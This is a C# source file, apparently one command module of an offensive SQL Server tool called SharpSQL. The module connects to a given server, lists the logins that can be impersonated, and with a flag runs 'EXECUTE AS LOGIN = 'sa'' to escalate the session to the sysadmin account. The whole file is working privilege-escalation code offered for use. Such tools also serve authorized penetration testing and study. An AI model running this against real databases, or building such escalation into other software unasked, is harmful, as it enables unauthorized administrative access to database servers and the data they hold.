using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace SharpSQL.Commands
{
    public class getlogin : ICommand
    {
        public static string CommandName => "getlogin";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Retrieve SQL Logins Available for Impersonation");
            Console.WriteLine("\tUsage: SharpSQL.exe getlogin /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");

            string user = "";
            string password = "";
            string connectInfo = "";
            string database = "";
            string connectserver = "";

            bool impersonate = false;
            bool sqlauth = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = true;
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                Environment.Exit(0);
            }

            string queryLogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(queryLogin, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]);
            reader.Close();

            string queryImp = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(queryImp, connection);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("[*] Login that can be impersonated: " + reader[0]);
            }
            reader.Close();

            if (impersonate)
            {
                string execAs = "EXECUTE AS LOGIN = 'sa';";
                command = new SqlCommand(execAs, connection);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Attempting impersonation..");
                reader.Close();

                command = new SqlCommand(queryLogin, connection);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Logged in as: " + reader[0]);
                reader.Close();

                connection.Close();
            }
            else
            {
                connection.Close();
            }
        }
    }
}
